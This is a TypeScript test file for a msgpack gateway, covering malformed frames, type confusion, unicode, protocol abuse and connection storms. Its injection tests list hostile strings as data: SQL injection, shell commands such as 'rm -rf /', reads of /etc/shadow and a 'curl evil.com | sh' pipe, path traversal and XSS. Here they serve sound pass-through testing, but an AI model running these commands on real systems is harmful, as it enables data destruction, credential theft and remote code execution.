/**
 * Gateway Edge Cases & Security Tests
 *
 * Tests for malformed input, protocol abuse, injection attempts, and other
 * adversarial client behavior. These tests verify the gateway handles
 * "stupid things clients try to send" gracefully.
 */

import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import { pack, unpack } from 'msgpackr';
import { Gateway } from '@src/gateway/gateway.js';
import { BunNetworkDevice, BunEntropyDevice } from '@src/hal/index.js';
import type { Kernel } from '@src/kernel/kernel.js';
import type { HAL } from '@src/hal/index.js';
import type { SyscallDispatcher } from '@src/syscall/dispatcher.js';
import type { Process, Response } from '@src/syscall/types.js';

// =============================================================================
// TEST HELPERS
// =============================================================================

function createMockProcess(overrides: Partial<Process> = {}): Process {
    return {
        id: crypto.randomUUID(),
        parent: '',
        user: 'test',
        worker: {} as Worker,
        virtual: false,
        state: 'running',
        cmd: '/bin/test',
        cwd: '/',
        env: { HOME: '/', USER: 'test' },
        args: [],
        pathDirs: new Map(),
        handles: new Map(),
        nextHandle: 3,
        children: new Map(),
        nextPid: 1,
        activeStreams: new Map(),
        streamPingHandlers: new Map(),
        ...overrides,
    };
}

function createMockHAL(): HAL {
    return {
        network: new BunNetworkDevice(),
        entropy: new BunEntropyDevice(),
    } as unknown as HAL;
}

function createMockKernel(init?: Process): Kernel {
    const initProcess = init ?? createMockProcess({ cmd: '/app/init.ts' });
    const processes = new Map<string, Process>([[initProcess.id, initProcess]]);

    return {
        hal: createMockHAL(),
        processes: {
            getInit: () => initProcess,
            get: (id: string) => processes.get(id),
            all: () => Array.from(processes.values()),
            register: (proc: Process) => {
                processes.set(proc.id, proc);
            },
            reparentOrphans: () => {},
        },
        leasedWorkers: new Map(),
        waiters: new Map(),
    } as unknown as Kernel;
}

function createMockDispatcher(
    handler?: (proc: Process, id: string, name: string, args: unknown[]) => AsyncIterable<Response>,
): SyscallDispatcher {
    const defaultHandler = async function* (): AsyncIterable<Response> {
        yield { op: 'ok', data: { success: true } };
    };

    return {
        execute: handler ?? defaultHandler,
    } as unknown as SyscallDispatcher;
}

/**
 * Encode a message as length-prefixed msgpack frame.
 */
function encodeFrame(message: unknown): Uint8Array {
    const payload = pack(message);
    const frame = new Uint8Array(4 + payload.length);
    const view = new DataView(frame.buffer);

    view.setUint32(0, payload.length);
    frame.set(payload, 4);

    return frame;
}

/**
 * Send raw bytes to gateway and read response.
 */
async function sendRawBytes(
    port: number,
    data: Uint8Array,
    timeout = 500,
): Promise<{ responses: unknown[]; closed: boolean }> {
    const network = new BunNetworkDevice();
    const socket = await network.connect('localhost', port);
    const responses: unknown[] = [];
    let closed = false;

    try {
        await socket.write(data);

        // Read responses using msgpack framing
        let buffer = new Uint8Array(0);
        const startTime = Date.now();

        while (Date.now() - startTime < timeout) {
            try {
                const chunk = await socket.read({ timeout: 100 });

                if (chunk.length === 0) {
                    closed = true;
                    break;
                }

                // Append to buffer
                const newBuffer = new Uint8Array(buffer.length + chunk.length);

                newBuffer.set(buffer);
                newBuffer.set(chunk, buffer.length);
                buffer = newBuffer;

                // Process complete messages
                while (buffer.length >= 4) {
                    const view = new DataView(buffer.buffer, buffer.byteOffset);
                    const msgLength = view.getUint32(0);

                    if (buffer.length < 4 + msgLength) {
                        break;
                    }

                    const payload = buffer.slice(4, 4 + msgLength);

                    buffer = buffer.slice(4 + msgLength);
                    responses.push(unpack(payload));
                }
            }
            catch {
                break;
            }
        }

        return { responses, closed };
    }
    finally {
        await socket.close().catch(() => {});
    }
}

/**
 * Send a msgpack message and read responses.
 */
async function sendMessage(
    port: number,
    message: { id?: string; call?: string; args?: unknown[]; [key: string]: unknown },
    timeout = 500,
): Promise<{ responses: Record<string, unknown>[]; closed: boolean }> {
    const result = await sendRawBytes(port, encodeFrame(message), timeout);

    return {
        responses: result.responses as Record<string, unknown>[],
        closed: result.closed,
    };
}

// =============================================================================
// TESTS
// =============================================================================

describe('Gateway Edge Cases', () => {
    let port: number;
    let gateway: Gateway;
    let hal: HAL;

    beforeEach(() => {
        hal = createMockHAL();
    });

    afterEach(async () => {
        if (gateway) {
            await gateway.shutdown();
        }
    });

    // =========================================================================
    // MALFORMED FRAMING
    // =========================================================================

    describe('malformed framing', () => {
        it('should reject invalid msgpack bytes', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Send invalid msgpack with valid length prefix
            const invalidFrame = new Uint8Array(8);
            const view = new DataView(invalidFrame.buffer);

            view.setUint32(0, 4); // length = 4
            invalidFrame.set([0xff, 0xff, 0xff, 0xff], 4); // invalid msgpack

            const { responses } = await sendRawBytes(port, invalidFrame);

            expect(responses.length).toBeGreaterThan(0);

            const response = responses[0] as Record<string, unknown>;

            expect(response.op).toBe('error');
            expect(response.code).toBe('EINVAL');
        });

        it('should handle empty object (missing call field)', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const { responses } = await sendMessage(port, {});

            expect(responses.length).toBeGreaterThan(0);
            expect(responses[0]!.op).toBe('error');
            expect(responses[0]!.message).toContain('call');
        });

        it('should handle array instead of object', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Send array instead of object
            const { responses } = await sendRawBytes(port, encodeFrame(['id', 'call', 'args']));

            expect(responses.length).toBeGreaterThan(0);

            const response = responses[0] as Record<string, unknown>;

            expect(response.op).toBe('error');
        });

        it('should handle primitive values', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // WHY: msgpack primitives (unlike JSON) unpack successfully but aren't
            // valid request objects. Gateway may error or silently disconnect.
            for (const value of ['string', 42, true, false]) {
                const { responses } = await sendRawBytes(port, encodeFrame(value));

                // Either get error response or no response (silent disconnect)
                if (responses.length > 0) {
                    const response = responses[0] as Record<string, unknown>;

                    expect(response.op).toBe('error');
                }
            }

            // null specifically causes property access to throw, so expect no response
            const { responses: nullResponses } = await sendRawBytes(port, encodeFrame(null));

            // null.id throws, so no response expected
            expect(nullResponses.length).toBe(0);
        });

        it('should handle deeply nested objects', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Create deeply nested object
            let nested: Record<string, unknown> = { deep: true };

            for (let i = 0; i < 100; i++) {
                nested = { b: nested };
            }

            nested = { a: nested };

            const { responses } = await sendRawBytes(port, encodeFrame(nested));

            // Should fail on missing call field
            expect(responses.length).toBeGreaterThan(0);

            const response = responses[0] as Record<string, unknown>;

            expect(response.op).toBe('error');
        });

        it('should handle truncated frame (incomplete length prefix)', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Send only 2 bytes of length prefix
            const { responses, closed } = await sendRawBytes(port, new Uint8Array([0, 0]), 200);

            // Should get no response (buffered waiting for more data) or closed
            expect(responses.length === 0 || closed).toBe(true);
        });

        it('should handle truncated frame (incomplete payload)', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Send length prefix claiming 100 bytes but only 10 bytes of payload
            const frame = new Uint8Array(14);
            const view = new DataView(frame.buffer);

            view.setUint32(0, 100); // claims 100 bytes
            frame.set([1, 2, 3, 4, 5, 6, 7, 8, 9, 10], 4); // only 10 bytes

            const { responses, closed } = await sendRawBytes(port, frame, 200);

            // Should get no response (buffered waiting for more data) or closed
            expect(responses.length === 0 || closed).toBe(true);
        });
    });

    // =========================================================================
    // TYPE CONFUSION
    // =========================================================================

    describe('type confusion', () => {
        it('should handle numeric id', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const { responses } = await sendMessage(port, { id: 12345 as unknown as string, call: 'test' });

            // Should coerce or use as-is
            expect(responses[0]!.op).toBe('ok');
        });

        it('should handle null id', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const { responses } = await sendMessage(port, { id: null as unknown as string, call: 'test' });

            expect(responses[0]!.op).toBe('ok');
        });

        it('should handle object id', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const { responses } = await sendMessage(port, { id: { nested: 'id' } as unknown as string, call: 'test' });

            expect(responses[0]!.op).toBe('ok');
        });

        it('should handle array call field', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const { responses } = await sendMessage(port, { id: '1', call: ['file', 'open'] as unknown as string });

            // Array is truthy, so should attempt dispatch with stringified call
            expect(['ok', 'error']).toContain(responses[0]!.op as string);
        });

        it('should handle numeric call field', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const { responses } = await sendMessage(port, { id: '1', call: 42 as unknown as string });

            expect(['ok', 'error']).toContain(responses[0]!.op as string);
        });

        it('should handle string args instead of array', async () => {
            let _receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                _receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const { responses } = await sendMessage(port, { id: '1', call: 'test', args: 'not-array' as unknown as unknown[] });

            // Should use empty array fallback or handle gracefully
            expect(responses[0]!.op).toBe('ok');
        });
    });

    // =========================================================================
    // INJECTION ATTEMPTS
    // =========================================================================

    describe('injection attempts', () => {
        it('should pass through SQL injection payloads safely', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const sqlPayloads = [
                "'; DROP TABLE users; --",
                "1 OR 1=1",
                "1; DELETE FROM users",
                "' UNION SELECT * FROM passwords --",
                "admin'--",
            ];

            for (const payload of sqlPayloads) {
                await sendMessage(port, { id: '1', call: 'test', args: [payload] });
                // Gateway should pass payload through unchanged - it's the dispatcher's job to handle
                expect(receivedArgs[0]).toBe(payload);
            }
        });

        it('should pass through shell injection payloads safely', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const shellPayloads = [
                '; rm -rf /',
                '$(cat /etc/passwd)',
                '`whoami`',
                '| cat /etc/shadow',
                '&& curl evil.com | sh',
                '\n/bin/sh',
            ];

            for (const payload of shellPayloads) {
                await sendMessage(port, { id: '1', call: 'test', args: [payload] });
                expect(receivedArgs[0]).toBe(payload);
            }
        });

        it('should pass through path traversal payloads safely', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const pathPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/passwd%00.txt',
                '....//....//....//etc/passwd',
                '/proc/self/environ',
            ];

            for (const payload of pathPayloads) {
                await sendMessage(port, { id: '1', call: 'file:open', args: [payload] });
                expect(receivedArgs[0]).toBe(payload);
            }
        });

        it('should handle prototype pollution attempts', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // WHY: msgpack doesn't have __proto__ parsing issues like JSON, but we still
            // test that objects with these keys don't pollute prototypes
            const pollutionPayloads: Array<{ id: string; call: string; args?: unknown[] }> = [
                { id: '1', call: 'test' },
                { id: '1', call: 'test' },
                { id: '1', call: 'test', args: [{}] },
            ];

            for (const payload of pollutionPayloads) {
                const { responses } = await sendRawBytes(port, encodeFrame(payload));

                expect(responses.length).toBeGreaterThan(0);
                // Should not pollute Object prototype
                expect(({} as any).admin).toBeUndefined();
                expect(({} as any).polluted).toBeUndefined();
            }
        });

        it('should handle XSS payloads in strings', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const xssPayloads = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                'javascript:alert(1)',
                '<svg onload=alert(1)>',
            ];

            for (const payload of xssPayloads) {
                await sendMessage(port, { id: '1', call: 'test', args: [payload] });
                // Gateway passes through - it's a transport layer
                expect(receivedArgs[0]).toBe(payload);
            }
        });
    });

    // =========================================================================
    // UNICODE EDGE CASES
    // =========================================================================

    describe('unicode edge cases', () => {
        it('should handle emoji in strings', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            await sendMessage(port, { id: '1', call: 'test', args: ['Hello 👋 World 🌍'] });
            expect(receivedArgs[0]).toBe('Hello 👋 World 🌍');
        });

        it('should handle null bytes in strings', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            await sendMessage(port, { id: '1', call: 'test', args: ['before\u0000after'] });
            expect(receivedArgs[0]).toBe('before\u0000after');
        });

        it('should handle unicode characters', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            await sendMessage(port, { id: '1', call: 'test', args: ['Hello'] });

            expect(receivedArgs[0]).toBe('Hello');
        });

        it('should handle surrogate pairs', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Emoji that requires surrogate pair
            await sendMessage(port, { id: '1', call: 'test', args: ['𝕳𝖊𝖑𝖑𝖔'] });
            expect(receivedArgs[0]).toBe('𝕳𝖊𝖑𝖑𝖔');
        });

        it('should handle right-to-left text', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            await sendMessage(port, { id: '1', call: 'test', args: ['مرحبا بالعالم'] });
            expect(receivedArgs[0]).toBe('مرحبا بالعالم');
        });

        it('should handle zero-width characters', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Zero-width space, joiner, non-joiner
            await sendMessage(port, { id: '1', call: 'test', args: ['a\u200B\u200C\u200Db'] });
            expect(receivedArgs[0]).toBe('a\u200B\u200C\u200Db');
        });
    });

    // =========================================================================
    // BOUNDARY CONDITIONS
    // =========================================================================

    describe('boundary conditions', () => {
        it('should handle empty string call', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const { responses } = await sendMessage(port, { id: '1', call: '' });

            // Empty string is falsy, should error
            expect(responses[0]!.op).toBe('error');
        });

        it('should handle very long call name', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const longCall = 'a'.repeat(1000);
            const { responses } = await sendMessage(port, { id: '1', call: longCall }, 1000);

            expect(responses.length).toBeGreaterThan(0);
        });

        it('should handle very long id', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Use a moderately long id (1KB) to test without timeout issues
            const longId = 'x'.repeat(1000);
            const { responses } = await sendMessage(port, { id: longId, call: 'test' }, 1000);

            expect(responses.length).toBeGreaterThan(0);
            expect(responses[0]!.id).toBe(longId);
        });

        it('should handle empty args array', async () => {
            let receivedArgs: unknown[] | undefined;
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            await sendMessage(port, { id: '1', call: 'test', args: [] });
            expect(receivedArgs).toEqual([]);
        });

        it('should handle args with many elements', async () => {
            let receivedArgs: unknown[] | undefined;
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const manyArgs = Array.from({ length: 1000 }, (_, i) => i);

            await sendMessage(port, { id: '1', call: 'test', args: manyArgs });
            expect(receivedArgs).toHaveLength(1000);
        });

        it('should handle multiple consecutive frames', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Send two frames concatenated
            const frame1 = encodeFrame({ id: '1', call: 'test' });
            const frame2 = encodeFrame({ id: '2', call: 'test' });
            const combined = new Uint8Array(frame1.length + frame2.length);

            combined.set(frame1);
            combined.set(frame2, frame1.length);

            const { responses } = await sendRawBytes(port, combined, 1000);

            expect(responses.length).toBe(2);
        });
    });

    // =========================================================================
    // PROTOCOL ABUSE
    // =========================================================================

    describe('protocol abuse', () => {
        it('should handle binary garbage with valid length prefix', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Random binary data with valid length prefix
            const garbage = new Uint8Array(260);
            const view = new DataView(garbage.buffer);

            view.setUint32(0, 256); // length = 256

            for (let i = 4; i < 260; i++) {
                garbage[i] = i % 256;
            }

            const { responses } = await sendRawBytes(port, garbage);

            expect(responses.length).toBeGreaterThan(0);

            const response = responses[0] as Record<string, unknown>;

            expect(response.op).toBe('error');
        });

        it('should handle incomplete frame (partial)', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Send just the length prefix with no payload
            const { responses, closed } = await sendRawBytes(port, new Uint8Array([0, 0, 0, 10]), 200);

            // Either no response (buffered waiting for payload) or connection closed
            expect(responses.length === 0 || closed).toBe(true);
        });

        it('should handle rapid request spam', async () => {
            const callCount = { value: 0 };
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* () {
                callCount.value++;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Build many frames rapidly
            const frames: Uint8Array[] = [];

            for (let i = 0; i < 100; i++) {
                frames.push(encodeFrame({ id: String(i), call: 'test' }));
            }

            const totalLength = frames.reduce((sum, f) => sum + f.length, 0);
            const combined = new Uint8Array(totalLength);
            let offset = 0;

            for (const frame of frames) {
                combined.set(frame, offset);
                offset += frame.length;
            }

            await sendRawBytes(port, combined, 2000);

            // All requests should be processed
            expect(callCount.value).toBe(100);
        });

        it('should handle slow client (partial writes)', async () => {
            let received = false;
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* () {
                received = true;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const network = new BunNetworkDevice();
            const socket = await network.connect('localhost', port);

            // Send frame in small chunks
            const frame = encodeFrame({ id: '1', call: 'test' });

            for (let i = 0; i < frame.length; i++) {
                await socket.write(new Uint8Array([frame[i]!]));
                await Bun.sleep(10);
            }

            // Wait for response
            await Bun.sleep(100);
            expect(received).toBe(true);

            await socket.close();
        });

        it('should handle partial frame reassembly', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const network = new BunNetworkDevice();
            const socket = await network.connect('localhost', port);

            // Send frame in two parts
            const frame = encodeFrame({ id: '1', call: 'test' });
            const midpoint = Math.floor(frame.length / 2);

            await socket.write(frame.slice(0, midpoint));
            await Bun.sleep(50);
            await socket.write(frame.slice(midpoint));

            const chunk = await socket.read({ timeout: 500 });

            // Parse response (skip 4-byte length prefix)
            const responseView = new DataView(chunk.buffer, chunk.byteOffset);
            const responseLength = responseView.getUint32(0);
            const response = unpack(chunk.slice(4, 4 + responseLength)) as Record<string, unknown>;

            expect(response.op).toBe('ok');

            await socket.close();
        });
    });

    // =========================================================================
    // RESOURCE EXHAUSTION
    // =========================================================================

    describe('resource exhaustion', () => {
        it('should handle many concurrent connections', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const network = new BunNetworkDevice();
            const sockets: Awaited<ReturnType<typeof network.connect>>[] = [];

            // Open many connections
            for (let i = 0; i < 50; i++) {
                const socket = await network.connect('localhost', port);

                sockets.push(socket);
            }

            // Give time for all connections to be processed
            await Bun.sleep(50);
            expect(gateway.getClientCount()).toBe(50);

            // Close all
            await Promise.all(sockets.map(s => s.close()));

            // Give time for cleanup
            await Bun.sleep(50);
            expect(gateway.getClientCount()).toBe(0);
        });

        it('should recover after client storms', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            const network = new BunNetworkDevice();

            // Rapidly connect/disconnect
            for (let i = 0; i < 20; i++) {
                const socket = await network.connect('localhost', port);

                await socket.close();
            }

            await Bun.sleep(100);

            // Gateway should still work
            const { responses } = await sendMessage(port, { id: '1', call: 'test' });

            expect(responses[0]!.op).toBe('ok');
        });
    });

    // =========================================================================
    // SPECIAL CHARACTERS IN STRINGS
    // =========================================================================

    describe('special characters', () => {
        it('should handle newlines in strings', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            await sendMessage(port, { id: '1', call: 'test', args: ['line1\nline2\nline3'] });
            expect(receivedArgs[0]).toBe('line1\nline2\nline3');
        });

        it('should handle quotes in strings', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            await sendMessage(port, { id: '1', call: 'test', args: ['say "hello"'] });
            expect(receivedArgs[0]).toBe('say "hello"');
        });

        it('should handle backslashes', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            await sendMessage(port, { id: '1', call: 'test', args: ['C:\\Windows\\System32'] });
            expect(receivedArgs[0]).toBe('C:\\Windows\\System32');
        });

        it('should handle control characters', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });

            gateway = new Gateway(dispatcher, kernel, hal);
            port = await gateway.listen(0);

            // Tab, carriage return, form feed, backspace
            await sendMessage(port, { id: '1', call: 'test', args: ['a\t\r\f\bb'] });
            expect(receivedArgs[0]).toBe('a\t\r\f\bb');
        });
    });
});
